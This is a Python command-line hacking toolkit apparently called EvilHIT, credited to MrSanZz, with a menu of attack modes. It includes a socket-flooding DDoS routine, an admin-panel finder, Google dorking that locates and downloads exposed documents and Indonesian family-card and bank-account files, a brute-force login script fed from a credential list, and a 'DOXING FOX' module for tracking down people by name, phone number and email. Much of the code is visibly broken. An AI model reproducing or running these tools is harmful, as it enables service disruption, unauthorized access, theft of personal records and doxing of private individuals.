import time
import os
import googlesearch
import wget
import urllib.request
import colorama
from colorama import Fore, Style, init
import random
import socket
import requests
import sys
from googlesearch import search
from subprocess import getoutput
import argparse
import ipaddress
import faker
from faker import Faker
from bs4 import BeautifulSoup
import re
import phonenumbers
from phonenumbers import timezone, geocoder, carrier

global user_agents
user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
global success, info, fail
success, info, fail = Fore.GREEN + Style.BRIGHT, Fore.YELLOW + \
    Style.BRIGHT, Fore.RED + Style.BRIGHT
    
print("""\033[1;91m
                    ███████████████████████                   
                   ▒         ██████████████████               
                                     █████████████            
               ██████████████████▓      ████████████          
           ██████████████████████████      ███████████        
         ███████████████████████████████     ███████████      
       ███████████████████████████████████     ██████████     
     ███████████████████████████████████████     █████████    
    █████████████████████████████████████████     █████████   
   ███████████████████████████████████████████     █████████  
  █████████████████████████████████████████████     █████████ 
 ███████████████████████████████████████████████    █████████ 
████████████████████████████████████████████████     █████████
███████████████         ████       ██████████████    █████████
████████████      █████            ██████████████    █████████
██████████       ████         ██  ███████████████    ▓████████
████████        ██         █████ ████████████████    ▓████████
██████                  █████████████████████████    █████████
████                   ██████████████████████████    █████████
███     ███           ██████████████████████████     █████████
██   ████             ██████████████████████████    ██████████
   █████              █████████████████████████     █████████ 
  █████    ██         ████████████████████████     ██████████ 
  ████   ███           ██████████████████████     ██████████  
   ██    ███     ▓      ████████████████████     ███████████  
        ███     █         ████████████████      ███████████   
       ████    ██           ████████████      ████████████    
       ████    ██▒     █▓                  ██████████████     
        ███   ████     ██     ░         ████████████████      
          ▓   ████     ███     ██     ████████████████        
              ████     ███      ███     ████████████          
               ████     ███      ████       █████             
                 ██     ████      ██████                      
                        ██████     ██████▓                    
""")
global user_ip
user_ip = Faker()
ip_addr = user_ip.ipv4()
ip_address = user_ip.ipv6()
MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1


def random_ipv4():
    return  ipaddress.IPv4Address._string_from_ip_int(
        random.randint(0, MAX_IPV4)
    )

def random_ipv6():
    return ipaddress.IPv6Address._string_from_ip_int(
        random.randint(0, MAX_IPV6)
    )
random.seed(444)
random_ipv4()
'79.19.184.109'
random_ipv4()
'3.99.136.189'
random_ipv4()
'124.4.25.53'
random_ipv6()
'4fb7:270d:8ba9:c1ed:7124:317:e6be:81f2'
random_ipv6()
'fe02:b348:9465:dc65:6998:6627:1300:29c9'
random_ipv6()
'74a:dd88:1ff2:bfe3:1f3:81ad:debd:db88'    
time.sleep(0.5)
print("""
  ______       _  _  _____  _    _  _______
 |  ____|     (_)| ||_   _|| |  | ||__   __|
 | |__ __   __ _ | |  | |  | |__| |   | |
 |  __|\ \ / /| || |  | |  |  __  |   | |
 | |____\ V / | || | _| |_ | |  | |   | |
 |______|\_/  |_||_||_____||_|  |_|   |_|
            Made By : MrSanZz
        \033[1;33mhttps://github.com/MrSanZz
 """)
time.sleep(0.5)
print("\033[1;33mFake Ip : ", user_ip)
print(info + f'[ ]Remember !, If The Tools Had A Error, Please Waiting For The Update.[ ]')
print('\033[1;32m-' *22)
print("SELECT MODE : ")
print("1. Dump")
print("2. DDOS")
print("3. Admin Finder")
print("4. DORK ")
print("5. DataBase Finder (Example : Simcard, Idcard, Pasport)")
print("6. Bypass Login Admin")
print("7. Phone number info")
print("8. DOFOX")
print("9. Auto Dorking")
answer = input("choice : ")

if answer.startswith("1"):
    pass
    global domain

    global file_types
    file_types = ['doc', 'db', 'mdf', 'mpd', 'ndb', 'docx', 'docm', 'dot', 'dotx', 'dotm','ppt', 'pptx', 'pps', 'ppsx', 'ppsm', 'pptm', 'potm', 'pot','csv', 'pdf', 'xls', 'xlsx', 'xslsm', 'xlt', 'xltx', 'xltm', 'sql', 'txt']
                   
    print ("""
    ██████▀▀▀░░░░▀▀▀██████
    ███▀░░░░░░░░░░░░░░▀███
    ██│░░░░░░░░░░░░░░░░│██
    █▌│░░░░░░░░░░░░░░░░│▐█
    █░└┐░░░░░░░░░░░░░░░┌┘█
    █░░└┐░░░░░░░░░░░░░┌┘░█
    █░░┌┘▄▄▄▄░░░░▄▄▄▄▄└┐░█
    █▌░│████▌░░░▐█████│░▐█
    ██░│▐█▀▀░░▄░░▀▀██▌│░██
    █▀─┘░░░░░▐█▌░░░░░░└─▀█
    █▄░░▄▄▓░░▀█▀░░▓▄▄▄░░▄█
    █▄─┘██▌░░░░░░░░▐██└─▄█
    ██░░▐█─┬┬┬┬┬┬┬┬─█▌░░██
    █▌░░░▀. |┼.|┼|┼|┼▀ ░▐█
    ██▄░░░└┴┴┴┴┴┴┴┴┘░░▄█ █
    ████▄░░░░░░░░░░░░▄████
    ███████▄▄▄▄▄▄▄████████
    """)
    
    print("…………………../´¯/)       ")
    print("……………….../¯../.      ")
    print("………………../…./.        ")
    print("…………./´¯/’…’/´¯¯`·¸. ")
    print("………./’/…/…./……./¨¯\. ")
    print("……..(‘(…´…´…. ¯~/’…’)")
    print("………\……………..’…../.    ")
    print("…….…\………..... _.·´.  ")
    print("…………\…………..(.        ")
    print("…………..\………….\….      ")

    print("Leaker Mode")
    print("Do Not Use Https")

    print(info + f"-" * 73)
    print("Internet Connection Required : 5MBps (To Optimal The Tools)")
    print(f'\033[1;32mDump Mode')
    target = input("\nTarget Site : ")
    dirt = ("")
    counter = 1
    counter = counter + 1

    os.makedirs(target)

    def download_files(*args):
        # Nama direktori tempat Anda ingin menyimpan file
        target_directory = target
        # Loop melalui argumen (hasil pencarian)
        for result in args:
            # Ekstrak nama file dari URL menggunakan urlparse
            parsed_url = urlparse(results)
            file_name = os.path.basename(parsed_url.path)

            # Gabungkan direktori dengan nama file
            file_path = os.path.join(target_directory, file_name)

            # Unduh file
            response = requests.get(results)

            # Simpan file ke direktori yang ditentukan
            if response == True:
                with open(file_path, "wb") as file:
                    file.write(response.content)

    def dorker():
        request = 0
        path = target
        isdir = os.path.isdir(path)
        if isdir == True:
            pass
        else:
            os.mkdir(target)  
        os.chdir(target)    
    for files in file_types:
       try: 
            file_exists = ('.google-cookie')
            if file_exists == True:
             os.remove('.google-cookie')
            rand_user = random.choice(user_agents)
            print(info + f'\033[1;33m<!> Processing <!>: Searching Info..')
            for results in search(f'site:{target} filetype:{files}', tld='com', lang='en', num=int(f'{counter}'), start=0, stop=None, pause=5):
             print(success + f'[+]Found[+] : ')
             print(success + f'\033[1;33m{results}')
             wget.download(results, out=target)
             requ =+ 1
       except urllib.error.HTTPError as e:
             if e.code == 404:
                 print(fail + f' [404] Download Fail, Skipping')
                 continue
             if e.code == 403:
                 print(fail + f' [403] Download Fail, Skipping')
                 continue
             if e.code == 429:
                 print(fail + f' [429] Download Fail, Please Wait.')
                 time.sleep(5)
             else:
                 continue    
       except OSError:
                 continue
       except urllib.error.URLError:
                print(fail + f'[Error] File {files} could not be downloaded. Skipping.')
                continue
       except ModuleNotFoundError:
                print(fail + f'[Error] Did you already install requirements.txt?')
       except UnicodeDecodeError:
                continue 

    print ("Done...")
    print ("\n\t\t\t\t\033[34mMrSanZz\033[0m")
    print ("\t\t\033[1;91mExit\n\n")   
    exit()
elif answer.startswith("2"):
    pass
    print("""\033[1;32m
    ██████████████████████████████████████████████████████████████
    ██████████████████████████████████████████████████████████████
    ██████████████████████████████████████████████████████████████
    ██████████████████████████████████████████████████████████████
    ▓█████████████████████████████████████████████████████████████
    ▓█████████████████████████████████████████████████████████████
    ██████████████████████████████████████████████████████████████
    ██████████████████████████████████████████████████████████████
    ██████████████████████████████████████████████████████████████
    ██████████████████████████████████████████████████████████████
    █▓█████████████████████████████████████████▓▓█████████████████
    █▓▓███████████▓▒░░░░░▒▓█████████████████▓▒░░░░▒███████████████
    ▓▒▓██████████▒░░░░░░░░░▒██████████████▓▒░░░░░░░░▓█████████████
    ▒▒██████████▒░░░░░░░░░░░▒█████████████▒░░░░░░░░░░▓████████████
    ▒▓██████████▒░░░░░░░░░░░▒█████████████░░░░░░░░░░░▓██████████▓█
    ▒▒██████████▓░░░░░░░░░░▒▓█████████████▒░░░░░░░░░▒███████████▒▒
    ▒▒███████████▓░░░░░░▒░▒████████████████▒░░░░░░░▒▓██████████▒▒▒
    ▒▒█████████████▓▓▒▒▒▓█████████████████████████████████████▓▒▒▒
    ░░▓██████████████████████████████████████████████████████▒░░▒▒
    ░░░▓████████████████████████████████████████████████████▒░░░░░
    ░░░░▓██████████████████████████████████████████████████░░░░░░░
    ░░░░░▒███████████████████████████████████████████████▒░░░░░░░░
    ░░░░░░░░▒▓██████████████████████████████████████████░░░░░░░░░░
    ░░░░░░░░░░▒█████▓██████████████████████████▓▒▒█████▓░░░░░░░░░░
    ░░░░░░░░░░░▒█████▓░▒▒▓██████████████▓▓▓▒▒░░░░█████▓░░░░░░░░░░░
    ░░░░░░░░░░░░▓███████▒░░░░░░░░░░░░░░░░▒░░░░░▓█████▓░░░░░░░░░░░░
    ░░░░░░░░░░░░░▓████████▓▒▒░░░░░░░░░░░░░░▒▓███████▒░░░░░░░░░░░░░
    ░░░░░░░░░░░░░░▒▓███████████▓▓▒▒▒▒▒▓▓██████████▓░░░░░░░░░░░░░░░
    ▒▒▒▒▒▒▒░░░▒▒▒▒▒▒▒▓██████████████████████████▓░░░░░░░░░░░░░░▒▒▒
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓██████████████████████▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓████████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒███████████████████▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒███████████████████▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    """)
    time.sleep(0.5)
    print(f'\033DDOS MODE')
    targt = input("\nIP TARGET : ")
    prot = input("Port : ")
    size = input("Byte Size : ")
    time.sleep(0.5)
    print("Please Wait...")
    time.sleep(0.5)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error:
        print(f'Failed When Making Connection')
    print("Making Connection..")

    try:
        remote_ip = socket.gethostbyname(targt)
    except socket.gaierror:
        print("Unknown Host, Did u fill target correctly?")
        sys.exit()
    
    for i in range (0, size):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((targt, prot))
            random_integer = random.randint(0,10)
            message = "GET /? =" + str(random_integer) + " HTTP/1.1\r\n\r\n"
            s.sendall(message.encode())
            s.shutdown(socket.SHUT_WR)
            print ("\033[1;34mDestroying : ", targt, "\n")
        except socket.error:
            s.close()
    print("DDOS Finished")
elif answer.startswith("3"):
    print("ADMIN FINDER")
    print("(Beta)")
    website_url = input("\nTarget Site [Use HTTPS]: ")
    admin_paths = ["/admin/", "/admin/dashboard/", "/admin/login.php/", "/wp-admin/", "/login.php/", "/wp-admin.php/", "/wp-admin/index.php", "/admin/dashboard.html/", "/admin.html/", "/admin/", "/usuarios/", "/cpanel.php/", "/cpanel/", "/cpanel.htm/", "/controlpanel/", "/admin/upload.php/", "/wp-login.php/", "/administrator/", "/admin/add.php/", "/dashboard/", "/admin/dashboard/", "/admin/dashboard.php/", "/panel/", "/admin/panel/", "/adminpanel/", "/admin/controlpanel/", "/admin/cpanel/", "/admin/dashboard.php/", "/admin.html/", "/admin.php/", "/admin/cpanel.php/", "/admin/cp.php/"]
    
    req =+ 1
    
    for path in admin_paths:
        url = website_url + path
        response = requests.get(url)
        print(info + f'Finding Admin Page...')
        for admin_page in search(f'site:{website_url} inurl:{path}', tld='com', num=1, start=0, stop=None):
         if admin_page == True:
            print(success + f'Admin Page Found : ', url)
        else:
            print(fail + f'Cant Find Admin Page :(')

elif answer.startswith("4"):
    try:
        resultdork = input("Would you want to save the project? Y/N :")
        loges = ("")
    
    except KeyboardInterrupt:
        print("\n")   
        print("interrupt detected")
        sys.exit()
    
    def logger(resultdork):
        file = open((loges) + ".txt", "a")
        file.write(str(resultdork))
        file.write("\n")
        file.close()
    
    if resultdork.startswith("y" or "Y"):
        print("\n")
        loges = input("Name : ")
        logger(resultdork)
    else:
        print("Skipped")    
    try:    
                  dork = input("\nDork : ")
                  numr = input("Number Result 1-100 : ")
    
                  requ = 0
                  counter = 0    
    
                  for results in search(dork,tld="com", lang="id", num=int(numr), start=0, stop=None, pause=2):
                       rand_user = random.choice(user_agents)
                       counter = counter + 1
                       print("<!>Found<!> : ", results, counter)
                       time.sleep(0.5)
                       requ += 1
                       if requ >= int(numr):
                           break
    except urllib.error.HTTPError as e:
                       if e.code == 429:
                           print(fail + f' [429] Error, Try Again Later.')
                           
                           quit()    
                       resultdork = (counter, results)
     
                       logger(resultdork)
                       time.sleep(0.2)
                       
    print ("Done.")
    print ("\n\t\t\t\t\033[34mMrSanZz\033[0m")
    print ("\t\t\033[1;91mExit\n\n")
    exit()
elif answer.startswith("5"):
    time.sleep(0.5)
    print("""\033[1;91m
       
   ▓█████▄  ▄▄▄     ▄▄▄█████▓ ▄▄▄           █████▒██▓ ███▄    █ ▓█████▄ ▓█████  ██▀███  
   ▒██▀ ██▌▒████▄   ▓  ██▒ ▓▒▒████▄       ▓██   ▒▓██▒ ██ ▀█   █ ▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒
   ░██   █▌▒██  ▀█▄ ▒ ▓██░ ▒░▒██  ▀█▄     ▒████ ░▒██▒▓██  ▀█ ██▒░██   █▌▒███   ▓██ ░▄█ ▒
   ░▓█▄   ▌░██▄▄▄▄██░ ▓██▓ ░ ░██▄▄▄▄██    ░▓█▒  ░░██░▓██▒  ▐▌██▒░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄  
   ░▒████▓  ▓█   ▓██▒ ▒██▒ ░  ▓█   ▓██▒   ░▒█░   ░██░▒██░   ▓██░░▒████▓ ░▒████▒░██▓ ▒██▒
    ▒▒▓  ▒  ▒▒   ▓▒█░ ▒ ░░    ▒▒   ▓▒█░    ▒ ░   ░▓  ░ ▒░   ▒ ▒  ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
    ░ ▒  ▒   ▒   ▒▒ ░   ░      ▒   ▒▒ ░    ░      ▒ ░░ ░░   ░ ▒░ ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░
    ░ ░  ░   ░   ▒    ░        ░   ▒       ░ ░    ▒ ░   ░   ░ ░  ░ ░  ░    ░     ░░   ░ 
       ░          ░  ░              ░  ░           ░           ░    ░       ░  ░   ░     
    ░                                                            ░                      
    """)
    time.sleep(0.5)
    db1 = ["xls", "pdf", "csv", "kartu-keluarga.pdf", "kk.pdf", "kk.xls", "kk.xlsx", "kk.csv", "database/kk.pdf", "admin/data/kk.pdf", "kartukeluarga.pdf", "pdf/kk.pdf", "kk.csv", "kartukeluarga.csv", "admin/csv/kk.csv", "database/kk.csv", "admin/dataset/kk.csv", "csv/kk.csv", "kk.xls", "database/kk.xls", "admin/data/kk.xls", "xls/kk.xls"]
    db2 = ["xls", "pdf", "csv", "rekening.pdf", "rekening.xls", "rekening.xlsx", "rekening.csv", "database/rekening.pdf", "admin/data/rekening.pdf", "rekening.pdf", "pdf/rekening.pdf", "rekening.csv", "rekening.xlsx", "admin/csv/rekening.csv", "database/rekening.csv", "admin/dataset/rekening.csv", "csv/rekening.csv", "rekening.xls", "database/rekening.xls", "admin/data/rekening.xls", "xls/rekening.xls"]
    print("\033[1;33m-" * 22)
    print("Database Finder")
    print("1. KartuKeluarga Finder")
    print("2. Rekening Finder")
    print("3. Custom Finder")
    print("4. Data Finder With Dorking")
    dabass = input("choice : ")
    
    if dabass.startswith("1"):
        try:
             trgt = input("Target : ")
             req =+ 1
             file_exists = ('.google-cookie')
             if file_exists == True:
              os.remove('.google-cookie')
             rand_user = random.choice(user_agents)
             print(info + f'\033[1;33m<!> Processing <!>: Searching Info For KK..')
             for kk in search(f'site:{trgt} filetype:{db1}', tld='com', num=int(f'{req}'), start=0, stop=None):
                 print(success + f'[ + ] Found ! [ + ]')
                 print(success + f'{kk}')
        except urllib.error.HTTPError as e:
             if e.code == 404:
                 print(fail + f' [404] Download Fail, Skipping')
             if e.code == 403:
                 print(fail + f' [403] Download Fail, Skipping')
             if e.code == 429:
                 print(fail + f' [429] Download Fail, Please Wait.')
                 time.sleep(5)
    elif dabass.startswith("2"):
        try:
             trgt2 = input("Target : ")
             req =+ 1
             file_exists = ('.google-cookie')
             if file_exists == True:
              os.remove('.google-cookie')
             rand_user = random.choice(user_agents)
             print(info + f'\033[1;33m<!> Processing <!>: Searching Info For Rekening')
             for rekeng in search(f'site:{trgt2} filetype:{db2}', tld="com", num=int(f'{req}'), start=0, stop=None):
                 print(success + f'[ + ] Found ! [ + ]')
                 print(success + f'{rekeng}')
        except urllib.error.HTTPError as e:
             if e.code == 404:
                 print(fail + f' [404] Download Fail, Skipping')
             if e.code == 403:
                 print(fail + f' [403] Download Fail, Skipping')
             if e.code == 429:
                 print(fail + f' [429] Download Fail, Please Wait.')
                 time.sleep(5)
    elif dabass.startswith("3"):
        try:
             db_types = input("Database Types [Example : SimCard]: ")
             trgt3 = input("Target : ")
             db3 = ["xls", "pdf", "csv", f"{db_types}.pdf", f"{db_types}.xls", f"{db_types}.xlsx", f"{db_types}.csv", f"{db_types}" f"admin/database/{db_types}.pdf", f"database/{db_types}.pdf", f"admin/data/{db_types}.pdf", f"{db_types}.pdf", f"pdf/{db_types}.pdf", f"{db_types}.csv", f"{db_types}.xlsx", f"admin/csv/{db_types}.csv", f"database/{db_types}.csv", f"admin/dataset/{db_types}.csv", f"csv/{db_types}.csv", f"{db_types}.xls", f"database/{db_types}.xls", f"admin/data/{db_types}.xls", f"xls/{db_types}.xls"]
             req =+ 1
             file_exists = ('.google-cookie')
             if file_exists == True:
              os.remove('.google-cookie')
             rand_user = random.choice(user_agents)
             print(info + f'\033[1;33m<!> Processing <!>: Searching Info For {db_types}..')
             for databases in search(f'site:{trgt3} filetype:{db3}', tld="com", num=int(f'{req}'), start=0, stop=None):
                 print(success + f'[ + ] Found ! [ + ]')
                 print(success + f'{databases}')
        except urllib.error.HTTPError as e:
             if e.code == 404:
                 print(fail + f' [404] Download Fail, Skipping')
             if e.code == 403:
                 print(fail + f' [403] Download Fail, Skipping')
             if e.code == 429:
                 print(fail + f' [429] Download Fail, Please Wait.')
                 time.sleep(5)
    elif dabass.startswith("4"):
        try:
                  db1 = ["xls", "pdf", "csv", "kartu-keluarga.pdf", "kk.pdf", "kk.xls", "kk.xlsx", "kk.csv", "database/kk.pdf", "admin/data/kk.pdf", "kartukeluarga.pdf", "pdf/kk.pdf", "kk.csv", "kartukeluarga.csv", "admin/csv/kk.csv", "database/kk.csv", "admin/dataset/kk.csv", "csv/kk.csv", "kk.xls", "database/kk.xls", "admin/data/kk.xls", "xls/kk.xls"]
                  db2 = ["xls", "pdf", "csv", "rekening.pdf", "rekening.xls", "rekening.xlsx", "rekening.csv", "database/rekening.pdf", "admin/data/rekening.pdf", "rekening.pdf", "pdf/rekening.pdf", "rekening.csv", "rekening.xlsx", "admin/csv/rekening.csv", "database/rekening.csv", "admin/dataset/rekening.csv", "csv/rekening.csv", "rekening.xls", "database/rekening.xls", "admin/data/rekening.xls", "xls/rekening.xls"]
                  print("1. Kartu Keluarga")
                  print("2. Rekening")
                  dork = input("\nChoice : ")
                  numr =+ 1
    
                  requ = 0
                  counter = 0    
                  if dork.startswith("1"):
                      pass
                      for results in search(db1,tld="com", lang="id", num=int(numr), start=0, stop=None, pause=2):
                           rand_user = random.choice(user_agents)
                           counter = counter + 1
                           print("<!>Found<!> : ", results, counter)
                           wget.download(results, out=results)
                           time.sleep(0.5) 
                           requ += 1       
                           if requ >= int(numr):
                               break       
                  elif dork.startswith("2"):
                      pass                 
                      for results in search(db2,tld="com", lang="id", num=int(numr), start=0, stop=None, pause=2):
                           rand_user = random.choice(user_agents)
                           counter = counter + 1
                           print("<!>Found<!> : ", results, counter)
                           wget.download(results, out=results)
                           time.sleep(0.5)
                           requ += 1
                           if requ >= int(numr):
                               break        
        except urllib.error.HTTPError as e:
                       if e.code == 429:
                           print(fail + f' [429] Error, Try Again Later.')
                           
                           quit()    
                       
        print ("Done.")
        print ("\n\t\t\t\t\033[34mMrSanZz\033[0m")
        print ("\t\t\033[1;91mExit\n\n")
        exit()
                
elif answer.startswith("6"):
    pass
    time.sleep(0.5)
    print("""
        
     ▄▄▄· ·▄▄▄▄  • ▌ ▄ ·. ▪   ▐ ▄     ▄▄▄▄·  ▄· ▄▌ ▄▄▄· ▄▄▄· .▄▄ · .▄▄ · ▄▄▄ .▄▄▄  
    ▐█ ▀█ ██▪ ██ ·██ ▐███▪██ •█▌▐█    ▐█ ▀█▪▐█▪██▌▐█ ▄█▐█ ▀█ ▐█ ▀. ▐█ ▀. ▀▄.▀·▀▄ █·
    ▄█▀▀█ ▐█· ▐█▌▐█ ▌▐▌▐█·▐█·▐█▐▐▌    ▐█▀▀█▄▐█▌▐█▪ ██▀·▄█▀▀█ ▄▀▀▀█▄▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ 
    ▐█ ▪▐▌██. ██ ██ ██▌▐█▌▐█▌██▐█▌    ██▄▪▐█ ▐█▀·.▐█▪·•▐█ ▪▐▌▐█▄▪▐█▐█▄▪▐█▐█▄▄▌▐█•█▌
     ▀  ▀ ▀▀▀▀▀• ▀▀  █▪▀▀▀▀▀▀▀▀ █▪    ·▀▀▀▀   ▀ • .▀    ▀  ▀  ▀▀▀▀  ▀▀▀▀  ▀▀▀ .▀  ▀
    """)
    time.sleep(0.1)
    # URL halaman login
    login_url = input('\nLogin Page Target : ')

    # Membaca file list.txt untuk mendapatkan daftar nickname dan password
    with open('list.txt', 'r') as file:
        lines = file.readlines()

    # Memastikan ada setidaknya 2 baris (nickname dan password) untuk setiap pengguna
    if len(lines) % 2 != 0:
        print("list.txt At least having over 2 lines !")
        exit()

    # Inisialisasi sesi HTTP
    session = requests.Session()

    login_success = False  # Inisialisasi status login

    # Loop melalui nickname dan password satu per satu
    for i in range(0, len(lines), 2):
        nickname = lines[i].strip()
        password = lines[i + 1].strip()

    print(f'Sedang mencoba nick: {nickname}')
    print(f'Password: {password}')

    # Data yang akan Anda kirimkan untuk login
    login_data = {
        'username': nickname,
        'password': password
    }

    # Kirim permintaan GET untuk membuka halaman login dan mendapatkan cookie
    response = session.get(login_url)
    soup = BeautifulSoup(response.text, 'html.parser')

    # Temukan token CSRF jika diperlukan
    csrf_token = soup.find('input', {'name': 'csrf_token'})['value'] if soup.find('input', {'name': 'csrf_token'}) else ''

    # Tambahkan token CSRF ke data login
    login_data['csrf_token'] = csrf_token

    login_response = session.post(login_url, data=login_data)

    # Periksa apakah login berhasil dengan memeriksa status respons HTTP
    if 'login-success' in login_response.url:  # Ubah ini sesuai dengan URL yang menunjukkan login berhasil
        print(success + f'Login Successfully With Name : {nickname}')
        print('Password : ', password)
        login_success = True

    # Pengecekan akhir jika tidak ada yang berhasil login
    if not login_success:
        print(fail + f'Cant login to the website :(.')
elif answer.startswith("7"):
    pass
    pN = phonenumbers.parse(input("Phone Number : "))
    tZ = timezone.time_zones_for_number(pN)
    C = carrier.name_for_number(pN, 'en')
    R = geocoder.description_for_number(pN, 'en')
    print(tZ)
    print(C)
    print(R)
elif answer.startswith("8"):
    pass
    print("""\033[1;91m
                        ░░░░░░░░░░                     
                  ░░▒▓██████████████▓▒░░░              
              ░░▓███████████████████████▓▒░            
            ░▓█████████████████████████████▓░░         
          ░▓██████████████████████████████████░░       
       ░░▒█████████████████████████████████████▓░░     
       ░▒████████████████████████████████████████▒░    
       ▒██████████████████████████████████████████▒░   
      ░███████████████████████████████████████████▓    
      ▒███████████████████████████████████████████▓    
      ░███████████████████████████████████████████▒░   
      ░███████████████████████████████████████████░    
       ▒██████████████████████████████████████████░    
       ░█████████████████████████████████████████▒░    
       ░████████▓▓█░▒██████████████▓░▒▓▒█████████▒     
       ░█████░░░░▒▓░░▒░░▒█████████░░ ░▒░██░▒█████▒     
       ▒████▒░          ░▒██████▒▓░    ░██░░▓████▓░    
       ░████▒░         ░░▓██████▒░      ▓▒░░█████▒     
       ░▒████░░      ░░░███▒█░▓██▒░       ░▓█████░     
       ░▒█████▓▒░   ░░▓████░█░▒████▓░░░ ░▒███████▒     
       ░▒████████████████▒▒░█░░▓█████████████████░     
       ░░▒███████████████░  ░░░▒████████████████▒░     
         ░▒█████████████▓░ ░█▒░░▓██████████████▓░      
          ░▒████▒░███████░░░██░▒███████▒▒███▓▓▓░       
           ░██▓▓░░▓████████████████████▒░ ▒▓░░░░       
           ░▓█░ ░▒█████████████████████▒░ ▒▓░          
            ▒█   ░▓████████████████████░               
            ▒█    ▒████████████████▓██▓░               
            ░░    ░░██▓██▒██▓███▓▓█░▓█▓░               
                   ░██▒██▒▒█░███▓░█░▒█▒░               
                   ░██░▒█▒░▒░███▓░▓░▒█▒░               
                   ░██ ░░░  ░███▓░ ░░▓░                
                   ░██      ░▒█▓▓░  ░░░                
                    ▓█░     ░▒█░░░                     
                    ▒█░     ░▒█░                       
                    ░█░     ░▒▓░                       
                            ░░▓░                       
    """)
    print("""\033[1;33m
    ██████╗  ██████╗ ███████╗ ██████╗ ██╗  ██╗
    ██╔══██╗██╔═══██╗██╔════╝██╔═══██╗╚██╗██╔╝
    ██║  ██║██║   ██║█████╗  ██║   ██║ ╚███╔╝ 
    ██║  ██║██║   ██║██╔══╝  ██║   ██║ ██╔██╗ 
    ██████╔╝╚██████╔╝██║     ╚██████╔╝██╔╝ ██╗
    ╚═════╝  ╚═════╝ ╚═╝      ╚═════╝ ╚═╝  ╚═╝
                   DOXING FOX
                     V 1.3
    \033[1;94mNote : Dont Do For Illegal Purpose !!
    """)
    print("1. Doxing With Name, Telephone Num, Gmail")
    print("2. Doxing With Dorking")
    print("3. Doxing With Information From Site")
    
    choice = input("choice : ")
    
    if choice.startswith("1"):
        pass
        victim = input(f'\nName Somebody [Recommended To Use Full Name] : ')
        victim_numbers = input(f'\nPhone Number Target : ')
        victim_gmail = input(f'\nGmail Target [Its ok to skip] : ')
        dork = ['intext :', 'inurl :', 'index.php?id= intext :', 'intitle :', 'index.php?id intitle :', 'allintext :', 'allinurl :', 'allintitle :', 'inurl:user=']
        hehe = (f'{victim} \t {victim_numbers} \t {victim_gmail}')
        lsv = random.choice(dork)
    
        for doxing in hehe:
            try:
                counter = 1
                counter = counter + 1
                file_exists = ('.google-cookie')
                if file_exists == True:
                    os.remove(file_exists)
                rand_user = random.choice(user_agents)
                print(info + f'[ + ] Process [ + ] Looking for : ', victim)
                for results in search(f'{lsv} {doxing}', tld='com', num=2, start=0, stop=None, pause=2):
                    print(success + f'Success : ')
                    print(results)
                else:
                    print(fail + f'Failed Finding. PLease Wait')
            except urllib.error.HTTPError as e:
                 if e.code == 404:
                     print(fail + f' [404] Download Fail, Skipping')
                     continue
                 if e.code == 403:
                     print(fail + f' [403] Download Fail, Skipping')
                     continue
                 if e.code == 429:
                     print(fail + f' [429] Download Fail, Please Wait.')
                     time.sleep(5)
    elif choice.startswith("2"):
        pass
        target = input(f'\n\033[1;94mName Target [Recommended To User Full Name] : ')
        dork = ['intext :', 'inurl :', 'index.php?id= intext :', 'intitle :', 'index.php?id intitle :', 'allintext :', 'allinurl :', 'allintitle :', 'inurl:user=']
        
        requsts = 1
        requsts = requsts + 1
        
